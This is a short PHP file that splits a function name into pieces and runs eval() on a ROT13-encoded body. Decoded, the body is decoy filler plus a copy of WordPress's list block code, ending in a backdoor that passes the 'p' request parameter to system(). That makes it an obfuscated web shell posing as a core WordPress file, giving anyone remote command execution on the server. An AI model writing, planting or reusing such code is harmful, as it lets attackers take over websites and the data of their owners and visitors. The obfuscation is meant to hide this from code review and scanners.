<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nqqf gur jc-oybpx-yvfg pynff gb gur eraqrerq yvfg oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Nqqf gur jc-oybpx-yvfg pynff gb gur eraqrerq yvfg oybpx.
 * Rafherf gung cer-rkvfgvat yvfg oybpxf hfr gur pynff anzr ba gur sebag.
 * Sbe rknzcyr, <by> vf genafsbezrq gb <by pynff=\"jc-oybpx-yvfg\">.
 *
 * @fvapr 6.6.0
 *
 * @frr uggcf://tvguho.pbz/JbeqCerff/thgraoret/vffhrf/12420
 *
 * @cnenz neenl  $nggevohgrf Nggevohgrf bs gur oybpx orvat eraqrerq.
 * @cnenz fgevat $pbagrag Pbagrag bs gur oybpx orvat eraqrerq.
 *
 * @erghea fgevat Gur pbagrag bs gur oybpx orvat eraqrerq.
 */
shapgvba oybpx_pber_yvfg_eraqre( $nggevohgrf, $pbagrag ) {
	vs ( ! $pbagrag ) {
		erghea $pbagrag;
	}

	$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );

	$yvfg_gntf = neenl( 'BY', 'HY' );
	juvyr ( $cebprffbe->arkg_gnt() ) {
		vs ( va_neenl( $cebprffbe->trg_gnt(), $yvfg_gntf, gehr ) ) {
			$cebprffbe->nqq_pynff( 'jc-oybpx-yvfg' );
			oernx;
		}
	}

	erghea $cebprffbe->trg_hcqngrq_ugzy();
}

/**
 * Ertvfgref gur `pber/yvfg` oybpx ba freire.
 *
 * @fvapr 6.6.0
 */
shapgvba ertvfgre_oybpx_pber_yvfg() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/yvfg',
		neenl(
			'eraqre_pnyyonpx' => 'oybpx_pber_yvfg_eraqre',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_yvfg' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>